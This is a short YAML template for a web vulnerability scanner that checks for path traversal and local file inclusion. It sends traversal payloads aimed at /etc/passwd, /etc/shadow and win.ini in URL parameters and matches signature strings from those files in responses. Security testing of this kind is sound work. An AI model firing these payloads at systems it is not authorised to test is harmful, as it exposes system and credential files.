metadata:
  id: "path-traversal"
  name: "Path Traversal / File Inclusion"
  description: "Detects path traversal via file path payloads"
  severity: "high"
  tags: ["path", "traversal", "lfi", "file"]

engine: "http"
method: "GET"
path: "/file=FUZZ&path=FUZZ&load=FUZZ"

payloads:
  - name: "etc-passwd"
    value: "../../../../etc/passwd"
  - name: "etc-passwd-deep"
    value: "../../../../../../../../etc/passwd"
  - name: "etc-passwd-windows"
    value: "..\\..\\..\\windows\\win.ini"
  - name: "etc-shadow"
    value: "../../../../etc/shadow"

matchers:
  - type: "keyword"
    patterns:
      - "root:x:0:0"
      - "daemon:x:1:1"
      - "bin:x:2:2"
      - "for 16-bit app support"
      - "[extensions]"
    location: "body"
    condition: "or"
